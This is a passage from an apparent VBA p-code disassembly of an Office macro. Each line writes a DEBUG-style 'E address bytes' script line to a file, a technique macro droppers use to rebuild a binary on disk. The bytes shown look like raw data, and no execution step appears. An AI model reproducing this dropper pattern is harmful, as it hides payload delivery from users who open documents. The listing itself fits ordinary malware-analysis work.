' 	LitStr 0x0036 "E 5A10 09 F7 EF 09 F7 EF 09 F7 EF 2C 77 7D 22 37 3F 0B"
' 	PrintItemNL 
' Line #1636:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A20 22 2A 5E 79 83 7E 9A A5 9E B5 C4 94 A5 B2 41 4C"
' 	PrintItemNL 
' Line #1637:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A30 54 00 00 04 00 00 F7 F7 F7 F1 F1 F1 DA DA DA CF"
' 	PrintItemNL 
' Line #1638:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A40 D1 D1 C6 C7 CB B2 B6 BB 00 00 08 81 8C 9A 82 91"
' 	PrintItemNL 
' Line #1639:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A50 A4 48 5A 71 49 5D 76 4D 62 7D 59 6E 89 7D 93 AC"
' 	PrintItemNL 
' Line #1640:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A60 76 87 A1 58 6A 81 51 66 7C 51 66 7C 7E 95 AB 78"
' 	PrintItemNL 
' Line #1641:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A70 8F A5 8B A3 B9 86 9E B4 45 60 75 69 84 99 65 7E"
' 	PrintItemNL 
' Line #1642:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A80 92 69 81 95 75 8B 9D 65 77 88 54 64 75 75 82 92"
' 	PrintItemNL 
' Line #1643:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A90 A5 B0 BE C1 CA D8 CA D0 DD CF D3 DE D4 D6 E0 22"
' 	PrintItemNL 
' Line #1644:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5AA0 F3 ED 09 F7 EF 09 F7 EF 83 FA F7 F6 F5 F7 EB EA"
' 	PrintItemNL 
' Line #1645:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5AB0 EE C5 C5 CB B3 B4 BE BA BB C9 A3 A8 B7 A3 A9 BC"
' 	PrintItemNL 
' Line #1646:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5AC0 9C A3 B7 4E 57 72 12 1E 42 48 56 80 49 59 84 45"
' 	PrintItemNL 
' Line #1647:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5AD0 55 80 4D 5C 8A 45 53 83 47 55 86 45 52 86 3E 4C"
' 	PrintItemNL 
' Line #1648:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5AE0 81 41 4F 84 10 E3 E2 09 F7 EF 18 CF D6 46 57 8A"
' 	PrintItemNL 
' Line #1649:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5AF0 45 56 89 44 55 88 4A 5C 8B 4B 5E 8B 4B 5D 8C 49"
' 	PrintItemNL 
' Line #1650:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B00 5B 8A 20 BC C9 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1651:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B10 EF 09 F7 EF 0C ED E8 30 60 80 3C 52 76 48 5E 81"
' 	PrintItemNL 
' Line #1652:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B20 39 4F 72 1A 2F 4B 60 6E 80 92 9B A8 9B A2 AB B4"
' 	PrintItemNL 
' Line #1653:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B30 BA C1 31 E6 E1 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1654:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B40 EF 23 DC DC 56 72 8A 50 6E 87 4A 66 7E 4A 67 7C"
' 	PrintItemNL 
' Line #1655:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B50 61 7C 90 54 6E 7F 36 4F 5F 4E 67 77 6E 96 A2 13"
' 	PrintItemNL 
' Line #1656:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B60 DA D6 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1657:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B70 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 2B 3F 4A"
' 	PrintItemNL 
' Line #1658:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B80 1D 31 3C 1A 30 3B 66 81 8B 8B A5 B1 A3 B8 C7 7D"
' 	PrintItemNL 
' Line #1659:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5B90 8E 9B 26 31 39 00 00 06 00 00 F3 F3 F3 EF EF EF"
' 	PrintItemNL 
' Line #1660:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5BA0 DA DA DA CD CF CF C4 C5 C9 B5 B9 BE 00 01 0B 8E"
' 	PrintItemNL 
' Line #1661:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5BB0 99 A7 7F 8E A1 4A 5C 73 44 58 71 55 6A 85 47 5C"
' 	PrintItemNL 
' Line #1662:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5BC0 77 53 69 82 7D 8E A8 81 93 AA 5A 6F 84 4D 62 77"
' 	PrintItemNL 
' Line #1663:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5BD0 54 6B 81 5E 75 8B 75 8D A3 73 8B A1 5F 7A 8F 63"
' 	PrintItemNL 
' Line #1664:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5BE0 7E 93 5A 73 87 68 80 94 6E 83 98 5B 6F 81 44 53"
' 	PrintItemNL 
' Line #1665:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5BF0 66 50 5E 70 81 8D 9F A6 B0 C2 BC C3 D4 C3 C7 D9"
' 	PrintItemNL 
' Line #1666:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C00 C6 C9 D7 58 DF DF 09 F7 EF 09 F7 EF C2 EE EF EC"
' 	PrintItemNL 
' Line #1667:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C10 EB ED E7 E6 EA C7 C7 CD B6 B7 C1 AF B2 C0 9C A2"
' 	PrintItemNL 
' Line #1668:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C20 B5 9E A4 BB 86 8D A6 38 42 60 33 40 66 4C 5A 84"
' 	PrintItemNL 
' Line #1669:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C30 46 56 80 44 54 7F 4A 59 87 44 52 82 47 55 86 46"
' 	PrintItemNL 
' Line #1670:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C40 53 87 49 57 8B 4B 59 8D 11 E4 E4 09 F7 EF 23 BF"
' 	PrintItemNL 
' Line #1671:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C50 CD 4D 5E 8F 4B 5C 8D 49 5A 8B 4C 5F 8C 4B 5E 89"
' 	PrintItemNL 
' Line #1672:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C60 4A 5D 8A 49 5C 89 48 5B 88 20 BC C8 09 F7 EF 09"
' 	PrintItemNL 
' Line #1673:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C70 F7 EF 09 F7 EF 0C ED E8 3B 79 96 46 5C 80 38 4E"
' 	PrintItemNL 
' Line #1674:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C80 71 46 5D 7D 4C 63 83 3B 50 6B 4B 5A 6D 90 9B A9"
' 	PrintItemNL 
' Line #1675:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5C90 94 9D A7 A4 AD B6 90 A8 B0 1B E0 DB 09 F7 EF 09"
' 	PrintItemNL 
' Line #1676:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5CA0 F7 EF 10 F1 EB 5D 9D AD 5C 78 90 4D 6C 83 45 61"
' 	PrintItemNL 
' Line #1677:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5CB0 79 4B 68 7D 61 7B 8C 61 7B 8C 3D 56 66 51 6A 7A"
' 	PrintItemNL 
' Line #1678:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5CC0 77 91 9F 3D 64 71 17 9A 9D 0B EC E6 09 F7 EF 09"
' 	PrintItemNL 
' Line #1679:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5CD0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 0E 9E"
' 	PrintItemNL 
' Line #1680:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5CE0 9E 1F 33 3E 21 35 40 3A 50 5B 6C 85 8F 8A A2 AE"
' 	PrintItemNL 
' Line #1681:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5CF0 A3 B7 C8 76 85 95 32 3C 46 00 00 06 00 00 F6 F6"
' 	PrintItemNL 
' Line #1682:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D00 F6 F3 F3 F3 DF DF DF CE D0 D0 C1 C2 C6 B2 B6 BB"
' 	PrintItemNL 
' Line #1683:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D10 00 00 09 88 93 A1 86 95 A8 3F 51 68 44 58 71 81"
' 	PrintItemNL 
' Line #1684:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D20 96 B1 73 88 A3 3B 51 6A 47 58 72 71 83 9A 6B 80"
' 	PrintItemNL 
' Line #1685:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D30 95 5A 6F 84 48 60 74 35 4D 61 73 8C A0 8E A7 BB"
' 	PrintItemNL 
' Line #1686:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D40 63 7E 92 6B 86 9A 58 70 86 61 79 8D 5A 6F 84 56"
' 	PrintItemNL 
' Line #1687:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D50 69 7E 46 57 6C 3A 49 5C 58 67 7A 7F 8A 9E 9C A2"
' 	PrintItemNL 
' Line #1688:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D60 B9 A2 A7 BC AE B2 C4 A7 B9 C6 5F D7 D8 95 D3 D5"
' 	PrintItemNL 
' Line #1689:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D70 DC DD E1 E4 E6 E7 E0 E1 E5 C2 C5 CA B6 B8 C3 A6"
' 	PrintItemNL 
' Line #1690:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D80 AB BA 9B A2 B6 95 9C B7 65 6D 8B 25 2F 51 4A 57"
' 	PrintItemNL 
' Line #1691:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5D90 7D 48 57 7E 49 5A 81 4C 5C 86 4E 5E 89 50 5F 8D"
' 	PrintItemNL 
' Line #1692:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5DA0 52 60 90 51 5F 90 56 65 96 56 65 96 50 6E 9C 37"
' 	PrintItemNL 
' Line #1693:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5DB0 9C B6 52 64 93 51 63 92 4F 61 90 4E 61 8E 4F 60"
' 	PrintItemNL 
' Line #1694:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5DC0 8B 4D 5F 88 4A 5B 86 4A 5B 86 4A 5B 86 48 59 84"
' 	PrintItemNL 
' Line #1695:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5DD0 35 7E 9C 25 A5 B6 29 A9 B9 3A 69 89 50 63 89 4E"
' 	PrintItemNL 
' Line #1696:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5DE0 61 86 41 55 78 40 55 75 43 58 77 54 69 84 44 53"
' 	PrintItemNL 
' Line #1697:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5DF0 66 79 86 96 89 95 A1 97 A1 AB 84 8E 98 61 6D 77"
' 	PrintItemNL 
' Line #1698:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E00 36 99 9E 36 B6 BA 68 A7 B4 67 7F 95 60 7A 92 4D"
' 	PrintItemNL 
' Line #1699:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E10 69 81 46 63 78 55 73 86 60 7A 8B 6B 85 95 46 5F"
' 	PrintItemNL 
' Line #1700:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E20 6F 55 6E 7E 74 8D 9D 3C 55 65 26 3D 4D 1E 35 44"
' 	PrintItemNL 
' Line #1701:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E30 36 76 80 39 AE B3 30 B3 B5 36 B8 BA 1B 9D 9F 1F"
' 	PrintItemNL 
' Line #1702:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E40 6B 72 18 2B 38 20 33 40 27 3B 46 5A 6E 79 77 8D"
' 	PrintItemNL 
' Line #1703:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E50 99 8B A1 AD A2 B4 C5 6D 7C 8C 45 4F 59 00 00 06"
' 	PrintItemNL 
' Line #1704:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E60 00 00 F3 F3 F3 EF EF EF DD DD DD CE D0 D0 C1 C2"
' 	PrintItemNL 
' Line #1705:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E70 C6 B4 B8 BD 00 00 08 7E 89 97 97 A6 B9 4A 5C 73"
' 	PrintItemNL 
' Line #1706:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E80 3B 4F 68 5E 73 8E 8D A2 BD 8E A4 BD 61 72 8C 53"
' 	PrintItemNL 
' Line #1707:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5E90 65 7C 5A 6F 84 68 7D 92 46 5E 72 36 4E 62 63 7C"
' 	PrintItemNL 
' Line #1708:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5EA0 90 71 8A 9E 6D 88 9C 5F 7A 8E 65 7D 93 60 78 8E"
' 	PrintItemNL 
' Line #1709:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5EB0 46 5E 72 4D 62 77 49 5C 71 2D 3E 53 40 50 67 65"
' 	PrintItemNL 
' Line #1710:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5EC0 73 8A 6E 78 90 77 7D 94 90 95 AA AD B2 C1 BE C0"
' 	PrintItemNL 
' Line #1711:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5ED0 CB CC CF D4 E1 E2 E6 EC EE EF DD DE E2 B9 BB C3"
' 	PrintItemNL 
' Line #1712:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5EE0 AC AE B9 9C A0 B2 98 9D B6 8C 94 B2 54 5D 7F 29"
' 	PrintItemNL 
' Line #1713:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5EF0 35 59 52 60 84 43 53 78 4F 61 86 57 68 8F 56 66"
' 	PrintItemNL 
' Line #1714:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F00 90 5F 6F 9A 61 70 9E 5E 6D 9B 57 67 95 55 65 93"
' 	PrintItemNL 
' Line #1715:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F10 50 63 90 4D 60 8D 4B 5E 8B 4A 5D 88 49 5C 87 4A"
' 	PrintItemNL 
' Line #1716:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F20 5D 88 51 63 8C 4D 5F 88 49 5B 84 48 5A 83 49 5A"
' 	PrintItemNL 
' Line #1717:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F30 85 47 59 82 42 54 7D 3D 50 76 35 48 6E 3B 4E 73"
' 	PrintItemNL 
' Line #1718:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F40 43 56 7B 4A 5E 81 5E 73 93 4A 5F 7E 2E 44 60 5A"
' 	PrintItemNL 
' Line #1719:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F50 6E 87 46 57 6C 5C 6A 7C 7F 8C 9A 8C 9A A6 6A 78"
' 	PrintItemNL 
' Line #1720:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F60 84 58 66 72 52 63 70 68 7B 8A 77 8D 9F 5B 74 88"
' 	PrintItemNL 
' Line #1721:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F70 60 7B 90 4E 6B 80 4C 6A 7D 63 7F 90 62 7C 8C 70"
' 	PrintItemNL 
' Line #1722:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F80 8A 9A 48 61 71 55 6E 7E 6C 85 95 30 49 59 25 3C"
' 	PrintItemNL 
' Line #1723:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5F90 4C 1F 36 46 3D 54 63 5A 71 80 63 78 87 73 89 95"
' 	PrintItemNL 
' Line #1724:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5FA0 38 4E 5A 23 39 45 31 44 51 28 3B 48 2B 3F 4A 6A"
' 	PrintItemNL 
' Line #1725:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5FB0 7E 89 7D 93 9F 95 AA B9 A1 B3 C4 4A 5A 6A 38 42"
' 	PrintItemNL 
' Line #1726:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5FC0 4C 00 00 06 00 00 F7 F7 F7 ED ED ED E4 E4 E4 CE"
' 	PrintItemNL 
' Line #1727:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5FD0 D0 D0 C1 C2 C6 B8 BC C1 00 00 08 86 91 9F 89 98"
' 	PrintItemNL 
' Line #1728:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5FE0 AB 5F 71 88 63 77 90 53 68 83 56 6B 86 85 9B B4"
' 	PrintItemNL 
' Line #1729:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5FF0 A0 B1 CB 76 88 9F 65 7A 8F 51 69 7D 43 5B 6F 2F"
' 	PrintItemNL 
' Line #1730:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6000 47 5B 5E 77 8B 65 7E 92 6F 88 9C 61 7A 8E 62 7B"
' 	PrintItemNL 
' Line #1731:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6010 8F 5C 75 89 4E 65 7B 3A 4F 65 42 57 6D 46 58 6F"
' 	PrintItemNL 
' Line #1732:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6020 3F 50 6A 64 73 8D 57 62 7D 6D 77 8F 90 96 AD B8"
' 	PrintItemNL 
' Line #1733:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6030 BF D0 CC D0 DB D2 D5 DD E3 E6 EB E8 E9 ED DD E0"
' 	PrintItemNL 
' Line #1734:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6040 E5 B4 B7 BF AD B0 BE 98 9E B1 8E 95 B0 70 79 9A"
' 	PrintItemNL 
' Line #1735:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6050 33 3F 63 3A 47 6D 49 59 7D 5C 6C 90 6B 7E A1 6B"
' 	PrintItemNL 
' Line #1736:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6060 7D A2 61 72 99 58 68 92 53 63 8D 50 60 8B 4B 5C"
' 	PrintItemNL 
' Line #1737:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6070 87 4A 5B 86 47 5A 85 49 5D 86 4C 60 89 4D 61 8A"
' 	PrintItemNL 
' Line #1738:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6080 4B 60 86 49 5E 84 4C 5F 85 4C 5D 84 4B 5C 83 4A"
' 	PrintItemNL 
' Line #1739:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6090 5B 82 48 58 82 44 54 7E 3E 4E 78 3A 4B 72 3A 4B"
' 	PrintItemNL 
' Line #1740:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 60A0 72 37 49 6E 2F 42 65 39 4C 6D 55 69 88 5F 74 90"
' 	PrintItemNL 
' Line #1741:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 60B0 48 5D 79 31 45 5E 5A 6B 80 5A 6A 7B 66 76 87 7E"
' 	PrintItemNL 
' Line #1742:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 60C0 8D 9D 69 78 88 50 60 70 46 59 68 55 69 7A 78 8E"
' 	PrintItemNL 
' Line #1743:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 60D0 A0 5E 77 8B 5F 7A 8E 50 6B 7F 49 64 78 5F 7B 8C"
' 	PrintItemNL 
' Line #1744:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 60E0 69 83 93 6F 89 99 4C 64 76 5A 72 84 51 6A 7A 27"
' 	PrintItemNL 
' Line #1745:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 60F0 40 50 1A 31 41 2A 41 51 3B 52 62 50 67 76 60 75"
' 	PrintItemNL 
' Line #1746:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6100 84 80 95 A4 4D 63 6F 52 68 74 2F 42 4F 17 2A 37"
' 	PrintItemNL 
' Line #1747:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6110 4F 62 6F 6F 82 8F 8B A1 AD 9B B0 BF 86 9A AC 4F"
' 	PrintItemNL 
' Line #1748:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6120 5F 70 55 5E 6B 00 00 08 00 00 F6 F6 F6 EB EB EB"
' 	PrintItemNL 
' Line #1749:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6130 E2 E2 E2 CD CF CF C1 C2 C6 B8 BC C1 00 00 08 91"
' 	PrintItemNL 
' Line #1750:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6140 9C AA 84 93 A6 6C 7E 95 7C 90 A9 70 85 A0 55 6A"
' 	PrintItemNL 
' Line #1751:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6150 85 4A 60 79 65 76 90 83 98 AE 70 85 9A 69 81 95"
' 	PrintItemNL 
' Line #1752:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6160 47 5F 73 25 3D 51 54 6D 81 5E 77 8B 6E 87 9B 67"
' 	PrintItemNL 
' Line #1753:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6170 80 94 78 91 A5 5B 74 88 3D 54 6A 30 47 5D 40 54"
' 	PrintItemNL 
' Line #1754:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6180 6D 5D 71 8A 66 7A 93 5C 6D 87 59 65 81 78 83 9E"
' 	PrintItemNL 
' Line #1755:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6190 97 9F B6 B7 BE D1 D3 D9 E6 D9 DE E7 E1 E4 E9 EC"
' 	PrintItemNL 
' Line #1756:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 61A0 EF F4 D5 D8 DD BB BD C7 A3 A6 B5 94 9B AF 88 91"
' 	PrintItemNL 
' Line #1757:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 61B0 AC 5A 65 85 35 42 68 54 64 89 67 77 9B 6C 7D 9E"
' 	PrintItemNL 
' Line #1758:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 61C0 6B 7E A1 62 74 99 5A 6B 92 55 66 8D 53 63 8D 50"
' 	PrintItemNL 
' Line #1759:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 61D0 60 8A 4D 5F 88 4C 5E 87 49 5D 86 4A 5F 85 4C 61"
' 	PrintItemNL 
' Line #1760:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 61E0 87 4E 64 88 4E 64 88 4E 64 88 52 63 8A 4F 60 87"
' 	PrintItemNL 
' Line #1761:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 61F0 49 5A 81 44 55 7C 40 50 7A 3D 4D 77 3C 4D 74 3B"
' 	PrintItemNL 
' Line #1762:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6200 4C 73 39 4B 70 34 47 6A 31 44 67 34 48 67 3E 52"
' 	PrintItemNL 
' Line #1763:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6210 71 48 5D 79 4D 62 7D 4E 62 7B 3F 52 67 5B 6C 7F"
' 	PrintItemNL 
' Line #1764:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6220 5A 6B 7E 63 75 86 5E 70 81 41 53 64 30 44 55 59"
' 	PrintItemNL 
' Line #1765:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6230 70 80 77 8F A1 5E 78 89 66 7F 93 56 72 83 47 63"
' 	PrintItemNL 
' Line #1766:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6240 74 5E 7B 8A 6A 84 94 6A 84 94 45 5D 6F 43 5B 6D"
' 	PrintItemNL 
' Line #1767:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6250 44 5D 6D 30 49 59 1E 35 45 1F 36 46 2F 46 56 48"
' 	PrintItemNL 
' Line #1768:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6260 5F 6F 67 7C 8B 82 97 A6 58 6D 7C 5A 70 7C 58 6B"
' 	PrintItemNL 
' Line #1769:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6270 78 3B 4E 5B 5E 71 7E 80 93 A0 A2 B8 C4 92 A7 B6"
' 	PrintItemNL 
' Line #1770:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6280 52 66 78 31 43 54 51 5D 69 00 00 07 00 00 F6 F6"
' 	PrintItemNL 
' Line #1771:
